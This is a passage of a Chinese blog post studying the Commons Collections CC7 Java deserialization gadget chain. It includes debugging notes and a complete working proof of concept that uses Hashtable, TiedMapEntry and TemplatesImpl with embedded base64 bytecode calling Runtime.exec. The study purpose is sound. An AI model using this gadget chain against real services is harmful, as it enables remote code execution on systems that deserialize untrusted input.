+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220426000941004.png" alt="image-20220426000941004"></p>
+<h5 id="为什么put的key是yy和zZ"><a href="#为什么put的key是yy和zZ" class="headerlink" title="为什么put的key是yy和zZ"></a>为什么put的key是yy和zZ</h5><p>改动上面<code>LazyMap.put</code>的key值，可以发现计算器并不会如愿弹出来。跟进看看</p>
+<p>在第二次<code>reconstitutionPut</code>进入for循环后，有个if判断</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220426004430380.png" alt="image-20220426004430380"></p>
+<p>关键的<code>e.key.equals(key)</code>就在这里，但是前面其实还有个<code>e.hash == hash</code>，如果不满足这个条件，会提前结束这个判断。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220426005438085.png" alt="image-20220426005438085"></p>
+<p>所以为了让这里的hash比较等于true，找到了yy和zZ两个字符，因为它们的hashCode结果是一样的。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220426005714561.png" alt="image-20220426005714561"></p>
+<p>还有个坑点是例如我这样写gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;Aa&quot;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样写经过一轮<code>reconstitutionPut</code>后，基于lazyMap1的hash给tab[0]赋值了，而在第二轮<code>reconstitutionPut</code>，基于lazyMap2的hash计算得到<code>e= tab[1]</code>，e的值为null会退出for循环，导致触发不了我们的关键步骤。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220426010258756.png" alt="image-20220426010258756"></p>
+<p>综上我们需要两个<code>hashCode的</code>值是一样的key，也即是gadget里用到的yy和zZ。</p>
+<h5 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h5><p>前面分析过了，Hashtable在put方法时，也会触发<code>LazyMap.get()</code>，会触发<code>transform()</code>方法，为了避免我们本地触发命令执行，所以用反射的形式写。</p>
+<h5 id="关于LazyMap-put的Value值"><a href="#关于LazyMap-put的Value值" class="headerlink" title="关于LazyMap.put的Value值"></a>关于LazyMap.put的Value值</h5><p>我看很多师傅的文章似乎都没提这个点，我也是偶然发现我从yso照搬过来核心部分发现代码怎么都跑不对劲。</p>
+<p>先给大伙儿看看这个诡异的现象</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429141923605.png" alt="image-20220429141923605"></p>
+<p><code>Hashtable</code>经过两次put的后竟然只有一个元素！</p>
+<p>显然问题出在第二次put，跟入看看</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429143257582.png" alt="image-20220429143257582"></p>
+<p>竟然走入了这个if逻辑，这里直接<code>return</code>了，不会走到后面的<code>addEntry</code>，所以<code>Hashteble</code>的元素没有增加。</p>
+<p>再往前找找原因</p>
+<p>前面其实也讲过，在做put的时候也会触发到<code>LazyMap.get()</code>，因为会走到<code>AbstractMap.equals</code>的这里</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429143612174.png" alt="image-20220429143612174"></p>
+<p>接着就进入<code>LazyMap.get</code></p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429143759866.png" alt="image-20220429143759866"></p>
+<p>这里<code>this.factory</code>是<code>ConstantTransformer(1)</code>，经过<code>transform()</code>放回会返回1，会导致前面那里结果是true</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429144150829.png" alt="image-20220429144150829"></p>
+<p>最终返回true</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429144225859.png" alt="image-20220429144225859"></p>
+<p>即this.map.equals(obejct)返回true，则AbstractMapDecorator.equals返回true</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429144333588.png" alt="image-20220429144333588"></p>
+<p>即这里<code>entry.key.equals(key)</code>返回true</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429144453785.png" alt="image-20220429144453785"></p>
+<p>所以这里要解决也很简单，只要<code>LazyMap.put</code>时的value不能等于假的<code>fakeTransformers.transform()</code>返回的值。</p>
+<p>观察<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java">yso原作者实现的CC7</a>，可以看到CC7中的<code>transformerChain</code>是空的，而之前CC1用的是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections1final <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>显然这里是有意规避这个问题的。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429144710506.png" alt="image-20220429144710506"></p>
+<h3 id="魔改CC7"><a href="#魔改CC7" class="headerlink" title="魔改CC7"></a>魔改CC7</h3><h4 id="CC6-CC7合体"><a href="#CC6-CC7合体" class="headerlink" title="CC6+CC7合体"></a>CC6+CC7合体</h4><p>前面分析<code>reconstitutionPut</code>的时候可以看到，其实这里有对key做一次<code>hashCode()</code>操作。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429135559258.png" alt="image-20220429135559258"></p>
+<p>之前学习CC6的时候可以知道<code>TiedMapEntry.hashCode()</code>可以搞事触发<code>LazyMap.get</code></p>
+<p>所以可以缝合CC6和CC7得到一个HashTable出发的魔改CC6</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429135835952.png" alt="image-20220429135835952"></p>
+<p>调用链</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429140034613.png" alt="image-20220429140034613"></p>
+<p>核心部分:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  Gadet Chain:</span></span><br><span class="line"><span class="comment">//     java.util.Hashtable.readObject()</span></span><br><span class="line"><span class="comment">//     java.util.Hashtable.reconstitutionPut()</span></span><br><span class="line"><span class="comment">//        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">//         org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">//             org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">//                     java.lang.Runtime.exec()</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="改成无数组的"><a href="#改成无数组的" class="headerlink" title="改成无数组的"></a>改成无数组的</h4><p>显然也可以改成<code>TemplatesImpl</code>触发代码执行的无数组形式，没啥难度，拼接一下之前的无数组CC6就行了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = Base64.decodeBase64(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHUxieXRlY29kZXMvRXZpbFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcALgEAClNvdXJjZUZpbGUBABZFdmlsVGVtcGxhdGVzSW1wbC5qYXZhDAAcAB0HAC8MADAAMQEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHADIMADMANAcANQwANgA3AQA9L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcgwAOAA5AQAbYnl0ZWNvZGVzL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>.getBytes());</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;2333&quot;</span>);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">itransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    Map outerMap= LazyMap.decorate(innerMap,itransformer);</span><br><span class="line">    TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(tme, <span class="number">2</span>);</span><br><span class="line">    outerMap.clear();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> InvokerTransformer.class.getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    f.set(itransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">    oos.writeObject(hashtable);</span><br><span class="line">    oos.close();</span><br><span class="line">    System.out.println(barr);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用链</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220429140956216.png" alt="image-20220429140956216"></p>
+<p>核心调用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  Gadet Chain:</span></span><br><span class="line"><span class="comment">//     java.util.Hashtable.readObject()</span></span><br><span class="line"><span class="comment">//     java.util.Hashtable.reconstitutionPut()</span></span><br><span class="line"><span class="comment">//        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">//         org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">//             org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">//                     com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/04/28/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E4%B9%9D)-CC4%E7%AF%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-04-29 23:20:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F-%E5%8D%81-CC%E8%A1%A5%E6%BC%8F%E7%AF%87"><span class="toc-text">java安全漫谈观后感(十)-CC补漏篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsCollections5"><span class="toc-text">CommonsCollections5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yso%E4%B8%AD%E7%9A%84CC5"><span class="toc-text">yso中的CC5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-toString"><span class="toc-text">TiedMapEntry.toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-text">BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%B3%A8%E9%87%8A%E4%B8%AD%E7%9A%848u76"><span class="toc-text">关于注释中的8u76</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E7%BB%84%E7%9A%84CC5"><span class="toc-text">无数组的CC5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsCollections7"><span class="toc-text">CommonsCollections7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yso%E4%B8%AD%E7%9A%84CC7"><span class="toc-text">yso中的CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%B8%A4%E6%AC%A1Hashtable-put%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">执行两次Hashtable.put的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%80%E5%90%8E%E6%9C%89%E4%B8%80%E5%8F%A5remove"><span class="toc-text">为什么最后有一句remove</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88put%E7%9A%84key%E6%98%AFyy%E5%92%8CzZ"><span class="toc-text">为什么put的key是yy和zZ</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-text">反射</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELazyMap-put%E7%9A%84Value%E5%80%BC"><span class="toc-text">关于LazyMap.put的Value值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%94%B9CC7"><span class="toc-text">魔改CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CC6-CC7%E5%90%88%E4%BD%93"><span class="toc-text">CC6+CC7合体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B9%E6%88%90%E6%97%A0%E6%95%B0%E7%BB%84%E7%9A%84"><span class="toc-text">改成无数组的</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
